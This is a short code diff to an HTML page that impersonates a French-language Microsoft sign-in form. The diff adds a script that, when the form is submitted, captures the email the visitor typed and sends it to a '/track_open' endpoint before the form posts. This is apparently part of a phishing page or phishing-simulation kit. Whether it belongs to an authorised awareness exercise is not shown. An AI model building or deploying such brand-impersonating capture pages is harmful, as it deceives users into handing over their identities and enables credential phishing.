@@ -76,8 +76,27 @@
             <button type="submit">Se connecter</button>
         </form>
         <div class="footer">
-            <p>© 2025 Microsoft. Tous droits réservés.</p>
+            <p>&copy; 2025 Microsoft. Tous droits réservés.</p>
         </div>
     </div>
+
+    <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        let form = document.querySelector("form");
+
+        form.addEventListener("submit", function (event) {
+            let emailInput = document.querySelector("input[name='email']");
+            
+            if (emailInput && emailInput.value.trim() !== "") {
+                let email = encodeURIComponent(emailInput.value);
+                
+                // Effectuer une requête à /track_open AVANT d'envoyer le formulaire
+                fetch(`/track_open?email=${email}`)
+                    .then(response => console.log("Tracking enregistré pour " + email))
+                    .catch(error => console.error("Erreur tracking :", error));
+            }
+        });
+    });
+    </script>
 </body>
 </html>
